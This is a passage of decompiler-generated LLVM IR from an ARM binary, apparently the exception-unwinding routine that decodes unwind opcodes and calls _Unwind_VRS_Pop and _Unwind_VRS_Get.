  %v3_190a4 = udiv i32 %v0_190a4, 16777216
  %v1_190a8 = urem i32 %v3_190a4, 16
  %v3_190ac = mul i32 %v0_190a4, 256
  %v1_190b0 = add nuw nsw i32 %v1_190a8, 1
  store i32 %v1_190b0, i32* %r1.global-to-local, align 4
  %v1_190b4 = and i32 %v3_190a4, 240
  store i32 %v1_190b4, i32* %r3.global-to-local, align 4
  %v1_190b8 = load i32, i32* @r5, align 4
  %v2_190b8 = inttoptr i32 %v1_190b8 to i32*
  store i32 %v3_190ac, i32* %v2_190b8, align 4
  %v0_190bc = load i32, i32* %r1.global-to-local, align 4
  %v1_190bc = load i32, i32* %r3.global-to-local, align 4
  %v4_190bc = mul i32 %v1_190bc, 4096
  %v5_190bc = or i32 %v4_190bc, %v0_190bc
  br label %dec_label_pc_190c0

dec_label_pc_190c0:                               ; preds = %dec_label_pc_19070, %dec_label_pc_190a4
  %storemerge = phi i32 [ %v5_190bc, %dec_label_pc_190a4 ], [ 720897, %dec_label_pc_19070 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v0_190c0 = load i32, i32* @r7, align 4
  store i32 %v0_190c0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_190cc = call i32 @_Unwind_VRS_Pop(i32 %v0_190c0, i32 1, i32 5, i32 5)
  store i32 %v4_190cc, i32* %r0.global-to-local, align 4
  %v2_190d0 = icmp eq i32 %v4_190cc, 0
  store i1 %v2_190d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_190d0, label %dec_label_pc_18e08.backedge, label %dec_label_pc_190d8

dec_label_pc_190d8:                               ; preds = %dec_label_pc_19324, %dec_label_pc_19054, %dec_label_pc_19134, %dec_label_pc_194d8, %dec_label_pc_194a8, %dec_label_pc_19484, %dec_label_pc_19310, %dec_label_pc_190c0, %dec_label_pc_18ed4, %dec_label_pc_18ec8, %bb154, %.thread21
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18f30

dec_label_pc_190e0:                               ; preds = %dec_label_pc_18f98
  %v7_190e0 = icmp eq i32 %v1_18e68, 160
  store i1 %v7_190e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_190e0, label %dec_label_pc_190e8, label %dec_label_pc_19124

dec_label_pc_190e8:                               ; preds = %dec_label_pc_190e0
  %v0_190e8 = load i32, i32* %ip.global-to-local, align 4
  %v1_190e8 = urem i32 %v0_190e8, 8
  %v1_190ec = xor i32 %v1_190e8, 7
  store i32 %v1_190ec, i32* %r3.global-to-local, align 4
  %v6_190f4 = lshr i32 4080, %v1_190ec
  %v1_190f8 = and i32 %v0_18e60, 8
  %v2_190f8 = icmp eq i32 %v1_190f8, 0
  store i1 %v2_190f8, i1* %cpsr_z.global-to-local, align 1
  %v1_190fc = and i32 %v6_190f4, 4080
  %tmp155 = mul nuw nsw i32 %v1_190f8, 2048
  %tmp156 = or i32 %v1_190fc, %tmp155
  store i32 %tmp156, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19108

dec_label_pc_19108:                               ; preds = %.thread44, %.thread24, %dec_label_pc_19498.dec_label_pc_19108_crit_edge, %bb157, %dec_label_pc_192f4, %dec_label_pc_19288, %dec_label_pc_191e8, %dec_label_pc_190e8
  %v2_19110 = phi i32 [ %v2_1920c, %.thread44 ], [ %v2_19214, %bb157 ], [ %v2_19110.pre, %dec_label_pc_19498.dec_label_pc_19108_crit_edge ], [ %v2_19044, %.thread24 ], [ %storemerge130, %dec_label_pc_192f4 ], [ %storemerge131, %dec_label_pc_19288 ], [ %storemerge132, %dec_label_pc_191e8 ], [ %tmp156, %dec_label_pc_190e8 ]
  %v0_1910c = phi i32 [ 2, %.thread44 ], [ 1, %bb157 ], [ 0, %dec_label_pc_19498.dec_label_pc_19108_crit_edge ], [ 3, %.thread24 ], [ 2, %dec_label_pc_192f4 ], [ 3, %dec_label_pc_19288 ], [ 1, %dec_label_pc_191e8 ], [ 0, %dec_label_pc_190e8 ]
  %v0_19108 = load i32, i32* @r7, align 4
  store i32 %v0_19108, i32* %r0.global-to-local, align 4
  store i32 %v0_1910c, i32* %r3.global-to-local, align 4
  %v4_19110 = call i32 @_Unwind_VRS_Pop(i32 %v0_19108, i32 %v0_1910c, i32 %v2_19110, i32 %v0_1910c)
  store i32 %v4_19110, i32* %r0.global-to-local, align 4
  %v2_19114 = icmp eq i32 %v4_19110, 0
  store i1 %v2_19114, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19114, label %dec_label_pc_18e08.backedge, label %dec_label_pc_1911c

dec_label_pc_1911c:                               ; preds = %dec_label_pc_19108
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18f30

dec_label_pc_19124:                               ; preds = %dec_label_pc_190e0
  %v7_19124 = icmp eq i32 %v1_18e68, 176
  store i1 %v7_19124, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19124, label %dec_label_pc_1916c, label %dec_label_pc_1912c

dec_label_pc_1912c:                               ; preds = %dec_label_pc_19124
  %v7_1912c = icmp eq i32 %v1_18e68, 192
  store i1 %v7_1912c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1912c, label %dec_label_pc_1921c, label %dec_label_pc_19134

dec_label_pc_19134:                               ; preds = %dec_label_pc_1912c
  %v1_19134 = and i32 %v0_18e60, 248
  store i32 %v1_19134, i32* %r3.global-to-local, align 4
  %v7_19138 = icmp eq i32 %v1_19134, 208
  store i1 %v7_19138, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19138, label %dec_label_pc_19140, label %dec_label_pc_190d8

dec_label_pc_19140:                               ; preds = %dec_label_pc_19134
  %v1_19140 = urem i32 %v0_18e60, 8
  %v1_19144 = add nuw nsw i32 %v1_19140, 1
  %v1_19148 = or i32 %v1_19144, 524288
  store i32 %v1_19148, i32* %r2.global-to-local, align 4
  %v0_1914c = load i32, i32* @r7, align 4
  store i32 %v0_1914c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_19158 = call i32 @_Unwind_VRS_Pop(i32 %v0_1914c, i32 1, i32 %v1_19148, i32 5)
  store i32 %v4_19158, i32* %r0.global-to-local, align 4
  %v2_1915c = icmp eq i32 %v4_19158, 0
  store i1 %v2_1915c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1915c, label %dec_label_pc_18e08.backedge, label %dec_label_pc_19164

dec_label_pc_19164:                               ; preds = %dec_label_pc_19140
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18f30

dec_label_pc_1916c:                               ; preds = %dec_label_pc_19124
  %v0_1916c = load i32, i32* %ip.global-to-local, align 4
  %v7_1916c = icmp eq i32 %v0_1916c, 177
  store i1 %v7_1916c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1916c, label %dec_label_pc_19470, label %dec_label_pc_19174

dec_label_pc_19174:                               ; preds = %dec_label_pc_1916c
  %v7_19174 = icmp eq i32 %v0_1916c, 178
  store i1 %v7_19174, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19174, label %dec_label_pc_19348, label %dec_label_pc_1917c

dec_label_pc_1917c:                               ; preds = %dec_label_pc_19174
  %v7_1917c = icmp eq i32 %v0_1916c, 179
  store i1 %v7_1917c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1917c, label %dec_label_pc_19184, label %dec_label_pc_191f0

dec_label_pc_19184:                               ; preds = %dec_label_pc_1917c
  %v0_19184 = load i32, i32* @r5, align 4
  %v1_19184 = add i32 %v0_19184, 8
  %v2_19184 = inttoptr i32 %v1_19184 to i8*
  %v3_19184 = load i8, i8* %v2_19184, align 1
  %v4_19184 = zext i8 %v3_19184 to i32
  store i32 %v4_19184, i32* %r3.global-to-local, align 4
  %v2_19188 = icmp eq i8 %v3_19184, 0
  store i1 %v2_19188, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19188, label %dec_label_pc_19198, label %.thread30

.thread30:                                        ; preds = %dec_label_pc_19184
  %v2_1918c = add nsw i32 %v4_19184, -1
  store i32 %v2_1918c, i32* %r3.global-to-local, align 4
  %v2_19190 = trunc i32 %v2_1918c to i8
  store i8 %v2_19190, i8* %v2_19184, align 1
  %v0_19194.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19194.pr.pr, label %.thread30.dec_label_pc_19198_crit_edge, label %dec_label_pc_191cc

.thread30.dec_label_pc_19198_crit_edge:           ; preds = %.thread30
  %v0_19198.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19198

dec_label_pc_19198:                               ; preds = %.thread30.dec_label_pc_19198_crit_edge, %dec_label_pc_19184
  %v2_191b0 = phi i32 [ %v0_19198.pre, %.thread30.dec_label_pc_19198_crit_edge ], [ %v0_19184, %dec_label_pc_19184 ]
  %v1_19198 = add i32 %v2_191b0, 9
  %v2_19198 = inttoptr i32 %v1_19198 to i8*
  %v3_19198 = load i8, i8* %v2_19198, align 1
  %v4_19198 = zext i8 %v3_19198 to i32
  store i32 %v4_19198, i32* %r3.global-to-local, align 4
  %v2_1919c = icmp eq i8 %v3_19198, 0
  store i1 %v2_1919c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1919c, label %dec_label_pc_191e8, label %dec_label_pc_191ac

dec_label_pc_191ac:                               ; preds = %dec_label_pc_19198
  %v1_191ac = add nsw i32 %v4_19198, -1
  store i32 %v1_191ac, i32* %r3.global-to-local, align 4
  %v1_191b0 = trunc i32 %v1_191ac to i8
  store i8 %v1_191b0, i8* %v2_19198, align 1
  %v0_191b4 = load i32, i32* @r5, align 4
  %v1_191b4 = add i32 %v0_191b4, 4
  %v2_191b4 = inttoptr i32 %v1_191b4 to i32*
  %v3_191b4 = load i32, i32* %v2_191b4, align 4
  store i32 %v3_191b4, i32* %r2.global-to-local, align 4
  %v1_191b8 = inttoptr i32 %v3_191b4 to i32*
  %v2_191b8 = load i32, i32* %v1_191b8, align 4
  store i32 %v2_191b8, i32* %r0.global-to-local, align 4
  %v4_191b8 = add i32 %v3_191b4, 4
  store i32 %v4_191b8, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_191b8, i32* %v2_191b4, align 4
  %v0_191c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_191c4 = trunc i32 %v0_191c4 to i8
  %v2_191c4 = load i32, i32* @r5, align 4
  %v3_191c4 = add i32 %v2_191c4, 8
  %v4_191c4 = inttoptr i32 %v3_191c4 to i8*
  store i8 %v1_191c4, i8* %v4_191c4, align 1
  %v0_191c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_191c8 = load i32, i32* @r5, align 4
  %v2_191c8 = inttoptr i32 %v1_191c8 to i32*
  store i32 %v0_191c8, i32* %v2_191c8, align 4
  br label %dec_label_pc_191cc

dec_label_pc_191cc:                               ; preds = %.thread30, %dec_label_pc_191ac
  %v0_191cc = load i32, i32* %r0.global-to-local, align 4
  %v3_191cc = udiv i32 %v0_191cc, 16777216
  %v1_191d0 = urem i32 %v3_191cc, 16
  %v3_191d4 = mul i32 %v0_191cc, 256
  store i32 %v3_191d4, i32* %r0.global-to-local, align 4
  %v1_191d8 = add nuw nsw i32 %v1_191d0, 1
  store i32 %v1_191d8, i32* %r2.global-to-local, align 4
  %v1_191dc = and i32 %v3_191cc, 240
  store i32 %v1_191dc, i32* %r3.global-to-local, align 4
  %v1_191e0 = load i32, i32* @r5, align 4
  %v2_191e0 = inttoptr i32 %v1_191e0 to i32*
  store i32 %v3_191d4, i32* %v2_191e0, align 4
  %v0_191e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_191e4 = load i32, i32* %r3.global-to-local, align 4
  %v4_191e4 = mul i32 %v1_191e4, 4096
  %v5_191e4 = or i32 %v4_191e4, %v0_191e4
  br label %dec_label_pc_191e8

dec_label_pc_191e8:                               ; preds = %dec_label_pc_19198, %dec_label_pc_191cc
  %storemerge132 = phi i32 [ %v5_191e4, %dec_label_pc_191cc ], [ 720897, %dec_label_pc_19198 ]
  store i32 %storemerge132, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19108

dec_label_pc_191f0:                               ; preds = %dec_label_pc_1917c
  %v1_191f0 = and i32 %v0_18e60, 252
  store i32 %v1_191f0, i32* %r3.global-to-local, align 4
  %v7_191f4 = icmp eq i32 %v1_191f0, 180
  store i1 %v7_191f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_191f4, label %.thread44, label %bb157

.thread44:                                        ; preds = %dec_label_pc_191f0
  %v2_191f8 = urem i32 %v0_18e60, 4
  %v2_19200 = add nuw nsw i32 %v2_191f8, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_1920c = or i32 %v2_19200, 262144
  store i32 %v2_1920c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19108

bb157:                                            ; preds = %dec_label_pc_191f0
  %v2_191fc = urem i32 %v0_1916c, 8
  %v2_19204 = add nuw nsw i32 %v2_191fc, 1
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_19214 = or i32 %v2_19204, 524288
  store i32 %v2_19214, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19108

dec_label_pc_1921c:                               ; preds = %dec_label_pc_1912c
  %v0_1921c = load i32, i32* %ip.global-to-local, align 4
  %v7_1921c = icmp eq i32 %v0_1921c, 198
  store i1 %v7_1921c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1921c, label %dec_label_pc_19224, label %dec_label_pc_19028

dec_label_pc_19224:                               ; preds = %dec_label_pc_1921c
  %v0_19224 = load i32, i32* @r5, align 4
  %v1_19224 = add i32 %v0_19224, 8
  %v2_19224 = inttoptr i32 %v1_19224 to i8*
  %v3_19224 = load i8, i8* %v2_19224, align 1
  %v4_19224 = zext i8 %v3_19224 to i32
  store i32 %v4_19224, i32* %r3.global-to-local, align 4
  %v2_19228 = icmp eq i8 %v3_19224, 0
  store i1 %v2_19228, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19228, label %dec_label_pc_19238, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_19224
  %v2_1922c = add nsw i32 %v4_19224, -1
  store i32 %v2_1922c, i32* %r3.global-to-local, align 4
  %v2_19230 = trunc i32 %v2_1922c to i8
  store i8 %v2_19230, i8* %v2_19224, align 1
  %v0_19234.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19234.pr.pr, label %.thread48.dec_label_pc_19238_crit_edge, label %dec_label_pc_1926c

.thread48.dec_label_pc_19238_crit_edge:           ; preds = %.thread48
  %v0_19238.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19238

dec_label_pc_19238:                               ; preds = %.thread48.dec_label_pc_19238_crit_edge, %dec_label_pc_19224
  %v2_19250 = phi i32 [ %v0_19238.pre, %.thread48.dec_label_pc_19238_crit_edge ], [ %v0_19224, %dec_label_pc_19224 ]
  %v1_19238 = add i32 %v2_19250, 9
  %v2_19238 = inttoptr i32 %v1_19238 to i8*
  %v3_19238 = load i8, i8* %v2_19238, align 1
  %v4_19238 = zext i8 %v3_19238 to i32
  store i32 %v4_19238, i32* %r3.global-to-local, align 4
  %v2_1923c = icmp eq i8 %v3_19238, 0
  store i1 %v2_1923c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1923c, label %dec_label_pc_19288, label %dec_label_pc_1924c

dec_label_pc_1924c:                               ; preds = %dec_label_pc_19238
  %v1_1924c = add nsw i32 %v4_19238, -1
  store i32 %v1_1924c, i32* %r3.global-to-local, align 4
  %v1_19250 = trunc i32 %v1_1924c to i8
  store i8 %v1_19250, i8* %v2_19238, align 1
  %v0_19254 = load i32, i32* @r5, align 4
  %v1_19254 = add i32 %v0_19254, 4
  %v2_19254 = inttoptr i32 %v1_19254 to i32*
  %v3_19254 = load i32, i32* %v2_19254, align 4
  store i32 %v3_19254, i32* %r2.global-to-local, align 4
  %v1_19258 = inttoptr i32 %v3_19254 to i32*
  %v2_19258 = load i32, i32* %v1_19258, align 4
  store i32 %v2_19258, i32* %r0.global-to-local, align 4
  %v4_19258 = add i32 %v3_19254, 4
  store i32 %v4_19258, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_19258, i32* %v2_19254, align 4
  %v0_19264 = load i32, i32* %r3.global-to-local, align 4
  %v1_19264 = trunc i32 %v0_19264 to i8
  %v2_19264 = load i32, i32* @r5, align 4
  %v3_19264 = add i32 %v2_19264, 8
  %v4_19264 = inttoptr i32 %v3_19264 to i8*
  store i8 %v1_19264, i8* %v4_19264, align 1
  %v0_19268 = load i32, i32* %r0.global-to-local, align 4
  %v1_19268 = load i32, i32* @r5, align 4
  %v2_19268 = inttoptr i32 %v1_19268 to i32*
  store i32 %v0_19268, i32* %v2_19268, align 4
  br label %dec_label_pc_1926c

dec_label_pc_1926c:                               ; preds = %.thread48, %dec_label_pc_1924c
  %v0_1926c = load i32, i32* %r0.global-to-local, align 4
  %v3_1926c = udiv i32 %v0_1926c, 16777216
  %v1_19270 = urem i32 %v3_1926c, 16
  %v3_19274 = mul i32 %v0_1926c, 256
  store i32 %v3_19274, i32* %r0.global-to-local, align 4
  %v1_19278 = add nuw nsw i32 %v1_19270, 1
  store i32 %v1_19278, i32* %r2.global-to-local, align 4
  %v1_1927c = and i32 %v3_1926c, 240
  store i32 %v1_1927c, i32* %r3.global-to-local, align 4
  %v1_19280 = load i32, i32* @r5, align 4
  %v2_19280 = inttoptr i32 %v1_19280 to i32*
  store i32 %v3_19274, i32* %v2_19280, align 4
  %v0_19284 = load i32, i32* %r2.global-to-local, align 4
  %v1_19284 = load i32, i32* %r3.global-to-local, align 4
  %v4_19284 = mul i32 %v1_19284, 4096
  %v5_19284 = or i32 %v4_19284, %v0_19284
  br label %dec_label_pc_19288

dec_label_pc_19288:                               ; preds = %dec_label_pc_19238, %dec_label_pc_1926c
  %storemerge131 = phi i32 [ %v5_19284, %dec_label_pc_1926c ], [ 720897, %dec_label_pc_19238 ]
  store i32 %storemerge131, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19108

dec_label_pc_19290:                               ; preds = %dec_label_pc_1904c
  %v0_19290 = load i32, i32* @r5, align 4
  %v1_19290 = add i32 %v0_19290, 8
  %v2_19290 = inttoptr i32 %v1_19290 to i8*
  %v3_19290 = load i8, i8* %v2_19290, align 1
  %v4_19290 = zext i8 %v3_19290 to i32
  store i32 %v4_19290, i32* %r3.global-to-local, align 4
  %v2_19294 = icmp eq i8 %v3_19290, 0
  store i1 %v2_19294, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19294, label %dec_label_pc_192a4, label %.thread52

.thread52:                                        ; preds = %dec_label_pc_19290
  %v2_19298 = add nsw i32 %v4_19290, -1
  store i32 %v2_19298, i32* %r3.global-to-local, align 4
  %v2_1929c = trunc i32 %v2_19298 to i8
  store i8 %v2_1929c, i8* %v2_19290, align 1
  %v0_192a0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_192a0.pr.pr, label %.thread52.dec_label_pc_192a4_crit_edge, label %dec_label_pc_192d8

.thread52.dec_label_pc_192a4_crit_edge:           ; preds = %.thread52
  %v0_192a4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_192a4

dec_label_pc_192a4:                               ; preds = %.thread52.dec_label_pc_192a4_crit_edge, %dec_label_pc_19290
  %v2_192bc = phi i32 [ %v0_192a4.pre, %.thread52.dec_label_pc_192a4_crit_edge ], [ %v0_19290, %dec_label_pc_19290 ]
  %v1_192a4 = add i32 %v2_192bc, 9
  %v2_192a4 = inttoptr i32 %v1_192a4 to i8*
  %v3_192a4 = load i8, i8* %v2_192a4, align 1
  %v4_192a4 = zext i8 %v3_192a4 to i32
  store i32 %v4_192a4, i32* %r3.global-to-local, align 4
  %v2_192a8 = icmp eq i8 %v3_192a4, 0
  store i1 %v2_192a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_192a8, label %dec_label_pc_192f4, label %dec_label_pc_192b8

dec_label_pc_192b8:                               ; preds = %dec_label_pc_192a4
  %v1_192b8 = add nsw i32 %v4_192a4, -1
  store i32 %v1_192b8, i32* %r3.global-to-local, align 4
  %v1_192bc = trunc i32 %v1_192b8 to i8
  store i8 %v1_192bc, i8* %v2_192a4, align 1
  %v0_192c0 = load i32, i32* @r5, align 4
  %v1_192c0 = add i32 %v0_192c0, 4
  %v2_192c0 = inttoptr i32 %v1_192c0 to i32*
  %v3_192c0 = load i32, i32* %v2_192c0, align 4
  store i32 %v3_192c0, i32* %r2.global-to-local, align 4
  %v1_192c4 = inttoptr i32 %v3_192c0 to i32*
  %v2_192c4 = load i32, i32* %v1_192c4, align 4
  store i32 %v2_192c4, i32* %r0.global-to-local, align 4
  %v4_192c4 = add i32 %v3_192c0, 4
  store i32 %v4_192c4, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_192c4, i32* %v2_192c0, align 4
  %v0_192d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_192d0 = trunc i32 %v0_192d0 to i8
  %v2_192d0 = load i32, i32* @r5, align 4
  %v3_192d0 = add i32 %v2_192d0, 8
  %v4_192d0 = inttoptr i32 %v3_192d0 to i8*
  store i8 %v1_192d0, i8* %v4_192d0, align 1
  %v0_192d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_192d4 = load i32, i32* @r5, align 4
  %v2_192d4 = inttoptr i32 %v1_192d4 to i32*
  store i32 %v0_192d4, i32* %v2_192d4, align 4
  br label %dec_label_pc_192d8

dec_label_pc_192d8:                               ; preds = %.thread52, %dec_label_pc_192b8
  %v0_192d8 = load i32, i32* %r0.global-to-local, align 4
  %v3_192d8 = udiv i32 %v0_192d8, 16777216
  %v1_192dc = urem i32 %v3_192d8, 16
  %v3_192e0 = mul i32 %v0_192d8, 256
  store i32 %v3_192e0, i32* %r0.global-to-local, align 4
  %v1_192e4 = add nuw nsw i32 %v1_192dc, 1
  store i32 %v1_192e4, i32* %r2.global-to-local, align 4
  %v1_192e8 = and i32 %v3_192d8, 240
  store i32 %v1_192e8, i32* %r3.global-to-local, align 4
  %v1_192ec = load i32, i32* @r5, align 4
  %v2_192ec = inttoptr i32 %v1_192ec to i32*
  store i32 %v3_192e0, i32* %v2_192ec, align 4
  %v0_192f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_192f0 = load i32, i32* %r3.global-to-local, align 4
  %v4_192f0 = mul i32 %v1_192f0, 4096
  %v5_192f0 = or i32 %v4_192f0, %v0_192f0
  br label %dec_label_pc_192f4

dec_label_pc_192f4:                               ; preds = %dec_label_pc_192a4, %dec_label_pc_192d8
  %storemerge130 = phi i32 [ %v5_192f0, %dec_label_pc_192d8 ], [ 720897, %dec_label_pc_192a4 ]
  store i32 %storemerge130, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19108

dec_label_pc_192fc:                               ; preds = %dec_label_pc_19028
  %v0_192fc = load i32, i32* @r5, align 4
  %v1_192fc = add i32 %v0_192fc, 8
  %v2_192fc = inttoptr i32 %v1_192fc to i8*
  %v3_192fc = load i8, i8* %v2_192fc, align 1
  %v4_192fc = zext i8 %v3_192fc to i32
  store i32 %v4_192fc, i32* %r3.global-to-local, align 4
  %v2_19300 = icmp eq i8 %v3_192fc, 0
  store i1 %v2_19300, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19300, label %dec_label_pc_194a8, label %.thread56

.thread56:                                        ; preds = %dec_label_pc_192fc
  %v2_19304 = add nsw i32 %v4_192fc, -1
  store i32 %v2_19304, i32* %r3.global-to-local, align 4
  %v2_19308 = trunc i32 %v2_19304 to i8
  store i8 %v2_19308, i8* %v2_192fc, align 1
  %v0_1930c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1930c.pr.pr, label %.thread56.dec_label_pc_194a8_crit_edge, label %dec_label_pc_19310

.thread56.dec_label_pc_194a8_crit_edge:           ; preds = %.thread56
  %v0_194a8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_194a8

dec_label_pc_19310:                               ; preds = %.thread56, %dec_label_pc_194b4
  %v0_19310 = load i32, i32* %r0.global-to-local, align 4
  %v3_19310 = udiv i32 %v0_19310, 16777216
  store i32 %v3_19310, i32* %r3.global-to-local, align 4
  store i32 %v3_19310, i32* %r2.global-to-local, align 4
  %tmp184 = icmp ult i32 %v0_19310, 16777216
  store i1 %tmp184, i1* %cpsr_z.global-to-local, align 1
  %v3_19318 = mul i32 %v0_19310, 256
  store i32 %v3_19318, i32* %r0.global-to-local, align 4
  %v1_1931c = load i32, i32* @r5, align 4
  %v2_1931c = inttoptr i32 %v1_1931c to i32*
  store i32 %v3_19318, i32* %v2_1931c, align 4
  br i1 %tmp184, label %dec_label_pc_190d8, label %dec_label_pc_19324

dec_label_pc_19324:                               ; preds = %dec_label_pc_19310
  %v0_19324 = load i32, i32* %r3.global-to-local, align 4
  %v1_19324 = and i32 %v0_19324, 240
  store i32 %v1_19324, i32* %r3.global-to-local, align 4
  %v2_19324 = icmp eq i32 %v1_19324, 0
  store i1 %v2_19324, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19324, label %dec_label_pc_1932c, label %dec_label_pc_190d8

dec_label_pc_1932c:                               ; preds = %dec_label_pc_19324
  %v0_1932c = load i32, i32* @r7, align 4
  store i32 %v0_1932c, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_19334 = load i32, i32* %r2.global-to-local, align 4
  %v4_19334 = call i32 @_Unwind_VRS_Pop(i32 %v0_1932c, i32 4, i32 %v2_19334, i32 0)
  store i32 %v4_19334, i32* %r0.global-to-local, align 4
  %v2_19338 = icmp eq i32 %v4_19334, 0
  store i1 %v2_19338, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19338, label %dec_label_pc_18e08.backedge, label %dec_label_pc_19340

dec_label_pc_19340:                               ; preds = %dec_label_pc_1932c
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18f30

dec_label_pc_19348:                               ; preds = %dec_label_pc_19174
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_19354 = load i32, i32* @r7, align 4
  store i32 %v0_19354, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_19360 = call i32 @_Unwind_VRS_Get(i32 %v0_19354, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19360, i32* %r0.global-to-local, align 4
  %v0_19364 = load i32, i32* @r5, align 4
  %v1_19364 = add i32 %v0_19364, 8
  %v2_19364 = inttoptr i32 %v1_19364 to i8*
  %v3_19364 = load i8, i8* %v2_19364, align 1
  %v4_19364 = zext i8 %v3_19364 to i32
  store i32 %v4_19364, i32* %r1.global-to-local, align 4
  %v2_19368 = icmp eq i8 %v3_19364, 0
  store i1 %v2_19368, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19368, label %dec_label_pc_19378, label %.thread58

.thread58:                                        ; preds = %dec_label_pc_19348
  %v2_1936c = add nsw i32 %v4_19364, -1
  store i32 %v2_1936c, i32* %r3.global-to-local, align 4
  %v2_19370 = trunc i32 %v2_1936c to i8
  store i8 %v2_19370, i8* %v2_19364, align 1
  %v0_19374.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19374.pr.pr, label %.thread58.dec_label_pc_19378_crit_edge, label %dec_label_pc_193a4

.thread58.dec_label_pc_19378_crit_edge:           ; preds = %.thread58
  %v0_19378.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19378

dec_label_pc_19378:                               ; preds = %.thread58.dec_label_pc_19378_crit_edge, %dec_label_pc_19348
  %v2_1938c = phi i32 [ %v0_19378.pre, %.thread58.dec_label_pc_19378_crit_edge ], [ %v0_19364, %dec_label_pc_19348 ]
  %v1_19378 = add i32 %v2_1938c, 9
  %v2_19378 = inttoptr i32 %v1_19378 to i8*
  %v3_19378 = load i8, i8* %v2_19378, align 1
  %v4_19378 = zext i8 %v3_19378 to i32
  store i32 %v4_19378, i32* %r3.global-to-local, align 4
  %v2_1937c = icmp eq i8 %v3_19378, 0
  store i1 %v2_1937c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1937c, label %bb158, label %dec_label_pc_19388

bb158:                                            ; preds = %dec_label_pc_19378
  %v1_19380 = load i32, i32* @r6, align 4
  store i32 %v1_19380, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_193cc

dec_label_pc_19388:                               ; preds = %dec_label_pc_19378
  %v1_19388 = add nsw i32 %v4_19378, -1
  store i32 %v1_19388, i32* %r3.global-to-local, align 4
  %v1_1938c = trunc i32 %v1_19388 to i8
  store i8 %v1_1938c, i8* %v2_19378, align 1
  %v0_19390 = load i32, i32* @r5, align 4
  %v1_19390 = add i32 %v0_19390, 4
  %v2_19390 = inttoptr i32 %v1_19390 to i32*
  %v3_19390 = load i32, i32* %v2_19390, align 4
  store i32 %v3_19390, i32* %r2.global-to-local, align 4
  %v1_19394 = inttoptr i32 %v3_19390 to i32*
  %v2_19394 = load i32, i32* %v1_19394, align 4
  store i32 %v2_19394, i32* %r0.global-to-local, align 4
  %v4_19394 = add i32 %v3_19390, 4
  store i32 %v4_19394, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_1939c = inttoptr i32 %v0_19390 to i32*
